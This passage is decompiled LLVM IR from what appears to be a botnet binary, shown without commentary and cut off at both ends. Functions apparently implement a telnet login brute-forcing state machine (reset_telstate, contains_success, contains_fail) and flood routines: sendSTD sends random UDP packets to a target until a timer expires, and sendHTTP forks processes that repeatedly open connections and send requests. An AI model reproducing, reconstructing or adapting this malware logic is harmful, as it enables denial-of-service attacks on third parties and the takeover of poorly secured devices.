  %v0_804ae70 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae70 = add i32 %v0_804ae4f, 16
  %v3_804ae70 = inttoptr i32 %v2_804ae70 to i32*
  store i32 %v0_804ae70, i32* %v3_804ae70, align 4
  %v3_804ae71 = call i32 @advance_state(i32* %v1_804accd, i32 %stack_var_-620.244)
  store i32 %v3_804ae71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804ae7e:                             ; preds = %dec_label_pc_804ad4c
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804ae9a = inttoptr i32 %v0_804ad72 to i32*
  store i32 %v2_804a174, i32* %v3_804ae9a, align 4
  %v1_804ae9b = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804ae9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804aea8:                             ; preds = %dec_label_pc_804ac6d
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804aec3 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804aec3, i32* %eax.global-to-local, align 4
  %v1_804aec5 = add i32 %v2_804aec3, 7
  store i32 %v1_804aec5, i32* @ebx, align 4
  %v1_804aecb = add i32 %v0_804acba, 16
  %v2_804aecb = inttoptr i32 %v1_804aecb to i32*
  store i32 0, i32* %v2_804aecb, align 4
  %v1_804aecd = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804aecd = call i32 @__GI_time(i32* %v1_804aecd)
  store i32 %v2_804aecd, i32* %eax.global-to-local, align 4
  %v0_804aed5 = load i32, i32* @ebx, align 4
  %v7_804aed5 = icmp ult i32 %v0_804aed5, %v2_804aecd
  %v1_804aed7 = icmp eq i1 %v7_804aed5, false
  br i1 %v1_804aed7, label %dec_label_pc_804b063, label %dec_label_pc_804aedd

dec_label_pc_804aedd:                             ; preds = %dec_label_pc_804aea8
  %v0_804aed2 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804aef9 = inttoptr i32 %v0_804aed2 to i32*
  store i32 %v2_804a174, i32* %v3_804aef9, align 4
  %v1_804aefa = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804aefa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804af07:                             ; preds = %dec_label_pc_804a1ad
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804af0a = load i32, i32* @esp, align 4
  %v1_804af0d = add i32 %v0_804af0a, -16
  %v2_804af0d = inttoptr i32 %v1_804af0d to i32*
  store i32 0, i32* %v2_804af0d, align 4
  %v1_804af0f = inttoptr i32 %v6_804a1c3 to i32*
  %v2_804af0f = call i32 @__GI_time(i32* %v1_804af0f)
  %v0_804af1c = load i32, i32* @ebx, align 4
  %v2_804af2c = mul i32 %v0_804af1c, 28
  %v1_804af30 = add i32 %v2_804acec, %v2_804af2c
  %v2_804af33 = inttoptr i32 %v1_804af30 to i32*
  store i32 %v2_804af0f, i32* %v2_804af33, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804af4b = inttoptr i32 %v2_804a174 to i32*
  %v4_804af4b = load i32, i32* %v3_804af4b, align 4
  store i32 %v4_804af4b, i32* %eax.global-to-local, align 4
  %v0_804af4e = load i32, i32* @esp, align 4
  %v1_804af4e = add i32 %v0_804af4e, -4
  %v2_804af4e = inttoptr i32 %v1_804af4e to i32*
  store i32 16384, i32* %v2_804af4e, align 4
  %v1_804af53 = add i32 %v0_804af4e, -8
  %v2_804af53 = inttoptr i32 %v1_804af53 to i32*
  store i32 4, i32* %v2_804af53, align 4
  %v1_804af55 = add i32 %v0_804af4e, -12
  %v2_804af55 = inttoptr i32 %v1_804af55 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8056219.60 to i32), i32* %v2_804af55, align 4
  %v0_804af5a = load i32, i32* %eax.global-to-local, align 4
  %v2_804af5a = add i32 %v0_804af4e, -16
  %v3_804af5a = inttoptr i32 %v2_804af5a to i32*
  store i32 %v0_804af5a, i32* %v3_804af5a, align 4
  %v4_804af5b = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  %v0_804af60 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804af79 = load i32, i32* %v3_804af4b, align 4
  store i32 %v4_804af79, i32* %eax.global-to-local, align 4
  %v1_804af7c = add i32 %v0_804af60, 12
  %v2_804af7c = inttoptr i32 %v1_804af7c to i32*
  store i32 16384, i32* %v2_804af7c, align 4
  %v1_804af81 = add i32 %v0_804af60, 8
  %v2_804af81 = inttoptr i32 %v1_804af81 to i32*
  store i32 7, i32* %v2_804af81, align 4
  %v1_804af83 = add i32 %v0_804af60, 4
  %v2_804af83 = inttoptr i32 %v1_804af83 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_805621e.61 to i32), i32* %v2_804af83, align 4
  %v0_804af88 = load i32, i32* %eax.global-to-local, align 4
  %v3_804af88 = inttoptr i32 %v0_804af60 to i32*
  store i32 %v0_804af88, i32* %v3_804af88, align 4
  %v4_804af89 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  %v0_804af91 = load i32, i32* bitcast ([443 x i8]** @global_var_8059214.63 to i32*), align 4
  %v5_804af9b = inttoptr i32 %v0_804af91 to i8*
  %v1_804afa1 = and i32 %v0_804af91, -256
  store i32 %v1_804afa1, i32* %eax.global-to-local, align 4
  store i32 %v0_804af91, i32* @edi, align 4
  %v3_804afaa = call i32 @_strlen(i8* %v5_804af9b)
  store i32 %v3_804afaa, i32* @ebx, align 4
  %v0_804afb3 = load i32, i32* bitcast ([443 x i8]** @global_var_8059214.63 to i32*), align 4
  store i32 %v0_804afb3, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804afcf = load i32, i32* %v3_804af4b, align 4
  store i32 %v4_804afcf, i32* %eax.global-to-local, align 4
  %v0_804afd2 = load i32, i32* @esp, align 4
  %v1_804afd2 = add i32 %v0_804afd2, -4
  %v2_804afd2 = inttoptr i32 %v1_804afd2 to i32*
  store i32 16384, i32* %v2_804afd2, align 4
  %v0_804afd7 = load i32, i32* @ebx, align 4
  %v2_804afd7 = add i32 %v0_804afd2, -8
  %v3_804afd7 = inttoptr i32 %v2_804afd7 to i32*
  store i32 %v0_804afd7, i32* %v3_804afd7, align 4
  %v0_804afd8 = load i32, i32* @esi, align 4
  %v2_804afd8 = add i32 %v0_804afd2, -12
  %v3_804afd8 = inttoptr i32 %v2_804afd8 to i32*
  store i32 %v0_804afd8, i32* %v3_804afd8, align 4
  %v0_804afd9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804afd9 = add i32 %v0_804afd2, -16
  %v3_804afd9 = inttoptr i32 %v2_804afd9 to i32*
  store i32 %v0_804afd9, i32* %v3_804afd9, align 4
  %v5_804afda = call i32 @__libc_send(i32 %v0_804af91, i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a07d)
  store i32 %v5_804afda, i32* %eax.global-to-local, align 4
  %v0_804afdf = load i32, i32* @esp, align 4
  %v2_804afe2 = icmp slt i32 %v5_804afda, 0
  %v1_804afe4 = icmp eq i1 %v2_804afe2, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804afe4, label %dec_label_pc_804b00d, label %dec_label_pc_804afe6

dec_label_pc_804afe6:                             ; preds = %dec_label_pc_804af07
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804b002 = inttoptr i32 %v0_804afdf to i32*
  store i32 %v2_804a174, i32* %v3_804b002, align 4
  %v2_804b003 = call i32 @reset_telstate(i32 %v0_804af91)
  store i32 %v2_804b003, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804b00d:                             ; preds = %dec_label_pc_804af07
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804b028 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804b028, i32* %eax.global-to-local, align 4
  %v1_804b02a = add i32 %v2_804b028, 25
  store i32 %v1_804b02a, i32* @ebx, align 4
  %v2_804b030 = inttoptr i32 %v0_804afdf to i32*
  store i32 0, i32* %v2_804b030, align 4
  %tmp39 = inttoptr i32 %v0_804af91 to i32*
  %v3_804b032 = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804b032, i32* %eax.global-to-local, align 4
  %v0_804b03a = load i32, i32* @ebx, align 4
  %v7_804b03a = icmp ult i32 %v0_804b03a, %v3_804b032
  %v1_804b03c = icmp eq i1 %v7_804b03a, false
  br i1 %v1_804b03c, label %dec_label_pc_804b063, label %dec_label_pc_804b03e

dec_label_pc_804b03e:                             ; preds = %dec_label_pc_804b00d
  %v0_804b037 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804b05a = inttoptr i32 %v0_804b037 to i32*
  store i32 %v2_804a174, i32* %v3_804b05a, align 4
  %v2_804b05b = call i32 @reset_telstate(i32 %v0_804af91)
  store i32 %v2_804b05b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804b063:                             ; preds = %dec_label_pc_804a1ad, %dec_label_pc_804b00d, %dec_label_pc_804aea8, %dec_label_pc_804aac6, %dec_label_pc_804a842, %dec_label_pc_804a706, %dec_label_pc_804a38f, %dec_label_pc_804afe6, %dec_label_pc_804aedd, %dec_label_pc_804ae7e, %dec_label_pc_804adc7, %dec_label_pc_804ad9b, %dec_label_pc_804ad20, %dec_label_pc_804ac41, %dec_label_pc_804ac17, %dec_label_pc_804abbb, %dec_label_pc_804aafb, %dec_label_pc_804aa9a, %dec_label_pc_804aa6e, %dec_label_pc_804a9bd, %dec_label_pc_804a993, %dec_label_pc_804a937, %dec_label_pc_804a877, %dec_label_pc_804a816, %dec_label_pc_804a7ea, %dec_label_pc_804a73b, %dec_label_pc_804a6dc, %dec_label_pc_804a654, %dec_label_pc_804a62a, %dec_label_pc_804a4f4, %dec_label_pc_804a4ca, %dec_label_pc_804a36f, %dec_label_pc_804b03e
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.243, %dec_label_pc_804a1ad ], [ %stack_var_-624.243, %dec_label_pc_804b00d ], [ %stack_var_-624.243, %dec_label_pc_804b03e ], [ %stack_var_-624.243, %dec_label_pc_804afe6 ], [ %stack_var_-624.243, %dec_label_pc_804aea8 ], [ %stack_var_-624.243, %dec_label_pc_804aedd ], [ %stack_var_-624.243, %dec_label_pc_804ae7e ], [ %stack_var_-624.243, %dec_label_pc_804adc7 ], [ %stack_var_-624.243, %dec_label_pc_804ad9b ], [ %stack_var_-624.243, %dec_label_pc_804ad20 ], [ %v4_804ab44, %dec_label_pc_804ac41 ], [ %v4_804ab44, %dec_label_pc_804ac17 ], [ %v4_804ab44, %dec_label_pc_804abbb ], [ %stack_var_-624.243, %dec_label_pc_804aac6 ], [ %stack_var_-624.243, %dec_label_pc_804aafb ], [ %stack_var_-624.243, %dec_label_pc_804aa9a ], [ %stack_var_-624.243, %dec_label_pc_804aa6e ], [ %stack_var_-624.243, %dec_label_pc_804a9bd ], [ %stack_var_-624.243, %dec_label_pc_804a993 ], [ %stack_var_-624.243, %dec_label_pc_804a937 ], [ %stack_var_-624.243, %dec_label_pc_804a842 ], [ %stack_var_-624.243, %dec_label_pc_804a877 ], [ %stack_var_-624.243, %dec_label_pc_804a816 ], [ %stack_var_-624.243, %dec_label_pc_804a7ea ], [ %stack_var_-624.243, %dec_label_pc_804a706 ], [ %stack_var_-624.243, %dec_label_pc_804a73b ], [ %stack_var_-624.243, %dec_label_pc_804a6dc ], [ %stack_var_-624.243, %dec_label_pc_804a654 ], [ %stack_var_-624.243, %dec_label_pc_804a62a ], [ %stack_var_-624.243, %dec_label_pc_804a38f ], [ %stack_var_-624.243, %dec_label_pc_804a4f4 ], [ %stack_var_-624.243, %dec_label_pc_804a4ca ], [ %stack_var_-624.243, %dec_label_pc_804a36f ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.244, %dec_label_pc_804a1ad ], [ %stack_var_-620.244, %dec_label_pc_804b00d ], [ %stack_var_-620.244, %dec_label_pc_804b03e ], [ %stack_var_-620.244, %dec_label_pc_804afe6 ], [ %stack_var_-620.244, %dec_label_pc_804aea8 ], [ %stack_var_-620.244, %dec_label_pc_804aedd ], [ %stack_var_-620.244, %dec_label_pc_804ae7e ], [ %stack_var_-620.244, %dec_label_pc_804adc7 ], [ %stack_var_-620.244, %dec_label_pc_804ad9b ], [ %stack_var_-620.244, %dec_label_pc_804ad20 ], [ %stack_var_-620.244, %dec_label_pc_804ac41 ], [ %stack_var_-620.244, %dec_label_pc_804ac17 ], [ %stack_var_-620.244, %dec_label_pc_804abbb ], [ %stack_var_-620.244, %dec_label_pc_804aac6 ], [ %stack_var_-620.244, %dec_label_pc_804aafb ], [ %stack_var_-620.244, %dec_label_pc_804aa9a ], [ %stack_var_-620.244, %dec_label_pc_804aa6e ], [ %v4_804a8c0, %dec_label_pc_804a9bd ], [ %v4_804a8c0, %dec_label_pc_804a993 ], [ %v4_804a8c0, %dec_label_pc_804a937 ], [ %stack_var_-620.244, %dec_label_pc_804a842 ], [ %stack_var_-620.244, %dec_label_pc_804a877 ], [ %stack_var_-620.244, %dec_label_pc_804a816 ], [ %stack_var_-620.244, %dec_label_pc_804a7ea ], [ %stack_var_-620.244, %dec_label_pc_804a706 ], [ %stack_var_-620.244, %dec_label_pc_804a73b ], [ %stack_var_-620.244, %dec_label_pc_804a6dc ], [ %stack_var_-620.244, %dec_label_pc_804a654 ], [ %stack_var_-620.244, %dec_label_pc_804a62a ], [ %stack_var_-620.244, %dec_label_pc_804a38f ], [ %stack_var_-620.244, %dec_label_pc_804a4f4 ], [ %stack_var_-620.244, %dec_label_pc_804a4ca ], [ %stack_var_-620.244, %dec_label_pc_804a36f ]
  %v4_804b063 = add nuw nsw i32 %storemerge45, 1
  store i32 %v4_804b063, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b063, %arg2
  br i1 %exitcond, label %dec_label_pc_804a152, label %dec_label_pc_804a15e

; uselistorder directives
  uselistorder i32 %v4_804b063, { 1, 2, 0 }
  uselistorder i32 %stack_var_-620.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %v0_804af60, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804ad72, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ad19, { 1, 2, 0 }
  uselistorder i32* %v1_804accd, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804ac10, { 1, 0, 2 }
  uselistorder i32 %v0_804abb4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804ab44, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804aab6, { 1, 0 }
  uselistorder i32 %v0_804aa67, { 1, 2, 0 }
  uselistorder i32 %v0_804a98c, { 1, 0, 2 }
  uselistorder i32 %v0_804a930, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804a8c0, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804a832, { 1, 0 }
  uselistorder i32 %v0_804a7e3, { 1, 2, 0 }
  uselistorder i32 %v0_804a6a7, { 1, 0 }
  uselistorder i32 %v13_804a67f, { 1, 0 }
  uselistorder i32 %v0_804a67a, { 2, 0, 1 }
  uselistorder i32 %v0_804a5c5, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804a5c0, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804a570, { 1, 0 }
  uselistorder i32 %v2_804a554, { 1, 0 }
  uselistorder i32 %v0_804a50d, { 1, 0 }
  uselistorder i32 %v0_804a488, { 2, 0, 1 }
  uselistorder i32 %v12_804a460, { 1, 0 }
  uselistorder i32 %v0_804a45b, { 2, 0, 1 }
  uselistorder i32 %v2_804a3dd, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_804a3a2, { 2, 0, 1 }
  uselistorder i32 %v2_804a22d, { 1, 0 }
  uselistorder i32 %v6_804a1c3, { 9, 10, 11, 8, 6, 7, 5, 3, 4, 2, 1, 13, 12, 14, 0 }
  uselistorder i32* %v1_804a179, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804a176, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804a174, { 49, 50, 51, 52, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 33, 34, 35, 36, 37, 27, 28, 29, 30, 31, 32, 22, 23, 24, 25, 26, 16, 17, 18, 19, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804a172, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 6, 39, 5, 40, 41, 7, 42, 44, 8, 43, 9 }
  uselistorder i32 %v1_804a164, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 %stack_var_-624.243, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %stack_var_-620.244, { 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %storemerge45, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804a141, { 1, 2, 0 }
  uselistorder i32 %storemerge251, { 1, 0 }
  uselistorder i32 %v2_804a09a, { 1, 0 }
  uselistorder i32 %v2_804a07d, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32 %v1_804a029, { 1, 0, 2 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 4, 3, 5, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 5, 0, 9, 8, 4, 6, 10, 2, 1, 7, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 38, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32* %eax.global-to-local, { 200, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 81, 79, 80, 82, 83, 76, 84, 85, 86, 87, 88, 89, 91, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 116, 114, 115, 117, 118, 111, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 178, 193, 194, 195, 196, 197, 198, 199, 222, 201, 202, 215, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 223, 216, 217, 218, 219, 220, 221 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804b063, { 32, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 0 }
  uselistorder label %dec_label_pc_804a1ad, { 1, 0 }
  uselistorder label %dec_label_pc_804a15e, { 1, 0 }
  uselistorder label %dec_label_pc_804a152, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a141, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804b08a = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804b09a = call i32 @__GI_time(i32* null)
  %v1_804b0ac = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804b0b7 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804b0d8 = add i32 %v1_804b0ac, 12
  %v2_804b0d8 = inttoptr i32 %v1_804b0d8 to i32*
  %v3_804b0d8 = load i32, i32* %v2_804b0d8, align 4
  %v2_804b0e0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_804b0e6 = add i32 %v1_804b0ac, 16
  %v2_804b0e6 = inttoptr i32 %v1_804b0e6 to i32*
  %v3_804b0e6 = load i32, i32* %v2_804b0e6, align 4
  %v1_804b0e9 = inttoptr i32 %v3_804b0e6 to i32*
  %v2_804b0e9 = load i32, i32* %v1_804b0e9, align 4
  %v4_804b0f1 = call i32 @bcopy(i32 %v2_804b0e9, i32 %v2_804b0e0, i32 %v3_804b0d8)
  %v1_804b0fc = add i32 %v1_804b0ac, 8
  %v2_804b0fc = inttoptr i32 %v1_804b0fc to i32*
  %v3_804b0fc = load i32, i32* %v2_804b0fc, align 4
  store i32 %v3_804b0fc, i32* %stack_var_-44, align 4
  %v4_804b127 = bitcast i32* %stack_var_-188 to i16*
  %v5_804b1b2 = add i32 %v2_804b09a, %arg3
  br label %dec_label_pc_804b111

dec_label_pc_804b111:                             ; preds = %dec_label_pc_804b1d8, %entry
  %storemerge = phi i32 [ %v4_804b1d8, %dec_label_pc_804b1d8 ], [ 0, %entry ]
  %v5_804b127 = call i32 @memcpy(i16* %v4_804b127, i32 ptrtoint ([36 x i8*]* @global_var_80563e0.100 to i32), i32 144)
  store i32 %v5_804b127, i32* @eax, align 4
  %v0_804b12f = call i32 @random()
  %v2_804b13f = udiv i32 %v0_804b12f, 36
  %tmp = mul nsw i32 %v2_804b13f, -4
  %v2_804b15c = add i32 %v0_804b12f, %tmp
  store i32 %v2_804b15c, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804b111.dec_label_pc_804b1d8_crit_edge, label %dec_label_pc_804b17a

dec_label_pc_804b111.dec_label_pc_804b1d8_crit_edge: ; preds = %dec_label_pc_804b111
  br label %dec_label_pc_804b1d8

dec_label_pc_804b17a:                             ; preds = %dec_label_pc_804b111
  %v0_804b16a = load i32, i32* @ebp, align 4
  %v3_804b16a = add i32 %v0_804b16a, -184
  %v2_804b16a = mul i32 %v2_804b15c, 4
  %v4_804b16a = add i32 %v3_804b16a, %v2_804b16a
  %v5_804b16a = inttoptr i32 %v4_804b16a to i32*
  %v6_804b16a = load i32, i32* %v5_804b16a, align 4
  %v5_804b184 = call i32 @__libc_send(i32 %v4_804b08a, i32 %v6_804b16a, i32 65, i32 0)
  %v4_804b198 = call i32 @__libc_connect(i32 %v4_804b08a, i32 %v2_804b0b7, i32 16)
  %v2_804b1a5 = call i32 @__GI_time(i32* null)
  %v5_804b1b7 = icmp slt i32 %v2_804b1a5, %v5_804b1b2
  br i1 %v5_804b1b7, label %dec_label_pc_804b1d8, label %dec_label_pc_804b1b9

dec_label_pc_804b1b9:                             ; preds = %dec_label_pc_804b17a
  %v1_804b1bf = call i32 @__libc_close(i32 %v4_804b08a)
  %v1_804b1cc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b1d8:                             ; preds = %dec_label_pc_804b111.dec_label_pc_804b1d8_crit_edge, %dec_label_pc_804b17a
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804b111.dec_label_pc_804b1d8_crit_edge ], [ 0, %dec_label_pc_804b17a ]
  %v4_804b1d8 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804b111

; uselistorder directives
  uselistorder i32 %v2_804b15c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804b0ac, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_804b1d8, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-537 = alloca i32, align 4
  %stack_var_-536 = alloca i32, align 4
  %v0_804b1e3 = load i32, i32* @edi, align 4
  %v2_804b1f9 = call i32 @__GI_time(i32* null)
  %v5_804b201 = add i32 %v2_804b1f9, %arg5
  %v2_804b24a = ptrtoint i32* %stack_var_-536 to i32
  %v4_804b29f = bitcast i32* %stack_var_-536 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804b31038 = icmp sgt i32 %arg6, 0
  br i1 %v5_804b31038, label %dec_label_pc_804b21a.lr.ph, label %dec_label_pc_804b316

dec_label_pc_804b21a.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804b21a

dec_label_pc_804b21a:                             ; preds = %dec_label_pc_804b307, %dec_label_pc_804b21a.lr.ph
  %storemerge39 = phi i32 [ 0, %dec_label_pc_804b21a.lr.ph ], [ %v4_804b307, %dec_label_pc_804b307 ]
  %v0_804b21a = call i32 @random()
  %v5_804b251 = call i32 @sprintf(i32 %v2_804b24a, i32 ptrtoint ([64 x i8]* @global_var_8056470.139 to i32), i32 %arg1, i32 %arg4)
  %v1_804b259 = call i32 @__libc_fork(i32 %v2_804b24a)
  %v1_804b25e = icmp eq i32 %v1_804b259, 0
  br i1 %v1_804b25e, label %dec_label_pc_804b307, label %dec_label_pc_804b2e7.preheader

dec_label_pc_804b2e7.preheader:                   ; preds = %dec_label_pc_804b21a
  %v2_804b2ec32 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b2ec32, i32* @eax, align 4
  %v5_804b2f735 = icmp slt i32 %v2_804b2ec32, %v5_804b201
  br i1 %v5_804b2f735, label %dec_label_pc_804b268, label %dec_label_pc_804b2fd

dec_label_pc_804b268:                             ; preds = %dec_label_pc_804b2e7.preheader, %dec_label_pc_804b2e7.backedge
  %v3_804b27a = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804b285 = icmp eq i32 %v3_804b27a, 0
  br i1 %v4_804b285, label %dec_label_pc_804b2e7.backedge, label %dec_label_pc_804b28b

dec_label_pc_804b28b:                             ; preds = %dec_label_pc_804b268
  store i1 false, i1* @df, align 1
  store i32 %v2_804b24a, i32* @edi, align 4
  %v3_804b2a5 = call i32 @_strlen(i8* %v4_804b29f)
  %v4_804b2ba = call i32 @__libc_write(i32 %v3_804b27a, i32* nonnull %stack_var_-536, i32 %v3_804b2a5)
  %v4_804b2d1 = call i32 @__libc_read(i32 %v3_804b27a, i32* nonnull %stack_var_-537, i32 1)
